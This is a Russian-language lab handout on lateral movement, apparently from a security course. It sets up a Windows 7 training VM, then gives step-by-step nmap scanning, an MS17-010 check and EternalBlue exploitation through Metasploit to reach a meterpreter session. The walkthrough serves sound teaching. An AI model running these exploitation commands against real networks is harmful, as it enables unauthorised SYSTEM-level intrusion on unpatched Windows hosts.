*************************** 12 Lateral Movement **********************************


Практика «Разведка в сети и компрометация Windows-машин»
Подготовка

Требования к лабораторному стенду:

На вашей операционной системе должно быть установлено программное обеспечение VirtualBox

Поддерживаемые ОС: Linux,Windows, MacOS (x64). MacOS с архитектурой arm (m1/m2/…) не поддерживаются.
 

Для подготовки стенда:

Необходимо скачать архив по ссылке: Windows7.v2.7z (Зеркало: Windows7.v2.7z Яндекс.Диск)
https://disk.yandex.ru/d/9alOwiQ2NFmizw
https://cybered-my.sharepoint.com/:u:/g/personal/v_karmanov_cyber-ed_ru/EeBdtCWETQNPpUNMzaNpuA4BGImgmKz8LcQ4FThTXmz1oQ?e=C5tkwb

Распаковать данный архив и перейти в появившуюся директорию Windows7. Далее импортировать виртуальную машину Windows7 двойным нажатием на файл  Windows7.vbox.

После импорта виртуальной машины, запустить ее и войти под пользователем Alex с паролем HappyHacking, для инициализации сети ОС.

ОС Windows попросит вас настроить сетевое размещение и предложит выбрать из трех вариантов:

    Домашняя сеть
    Сеть предприятия
    Общественная сеть

Единственный вариант, который вы можете выбрать -  Общественная сеть.
 

Возможные проблемы:

1. Так как данный виртуальный стенд является виртуальной машиной на основе Windows7 ОС, операционная система Windows может испытывать трудности с получением сетевого адреса в вашей локальной сети. Убедитесь что в настройках виртуальной машины вы используете опцию “Bridged Adapter”, чтобы ваша виртуальная машина получила адрес в вашей физической сети.









# FLAG   Lateral Movement


Разбор базового примера

Вы получили доступ к локальной сети, ваша задача — найти Windows машины и попробовать поэксплуатировать обнаруженные уязвимости для получения доступа к учетным записям домена и его сервисам.

Поиск машин Windows в локальной сети

Когда вы обнаружили существующие узлы в сети и хотите выявить среди них узлы Windows, стоит начать с:

    Сканирования портов, принадлежащих Windows машинам
    Изучения трафика широковещательных запросов, которые инициируют Windows машины

Ход действий

1. Проведем разведку Windows-машины, начнем со сканирования открытых портов:

$ nmap -Pn -n -F -sT --open 192.168.10.0/24
# 12_01_1.png

2. Наибольший интерес тут представляет порт 445, используемый протоколом SMB для доступа к файлам и папкам и взаимодействия между хостами:

$ nmap -Pn -n -p 445 -sC -v --open 192.168.10.4
# 12_01_2.png

3. Данная версия Windows может быть подвержена MS17-010 – критической уязвимости, позволяющей атакующему выполнить произвольный код с правами пользователя SYSTEM. Найдем и используем скрипт nmap для проверки хоста на уязвимости:

$ find /usr/share/nmap/scripts -iname '*MS17*'

/usr/share/nmap/scripts/smb-vuln-ms17-010.nse

$ nmap -Pn -n -p 445 --script smb-vuln-ms17-010 -v --open 192.168.10.4
# 12_01_3.png

4. Для эксплуатации уязвимости используем Metasploit Framework:

$ msfconsole

5. Выбираем эксплойт:

msf6> search ms17-010

msf6> use exploit/windows/smb/ms17_010_eternalblue

6. Указываем адрес удаленной машины:

msf6> set RHOSTS 192.168.10.4

7. Запускаем эксплойт:

msf6> run
# 12_01_4.png



    После успешной эксплуатации уязвимости мы получаем доступ к управлению хостом с помощью meterpreter – С2-агента, предоставляющего множество удобных средств для выполнения команд и различного кода на удаленном хосте, загрузки и выгрузки файлов, использования хоста в качестве прокси-сервера и, главное, предоставление msf возможности выполнения различных локальных модулей, автоматизирующих повышение прав и постэксплуатацию на машине.

8. Ознакомимся с основными возможностями meterpreter:

meterpreter> help

9. Соберем информацию о системе и текущем пользователе:

meterpreter> sysinfo

meterpreter> getuid
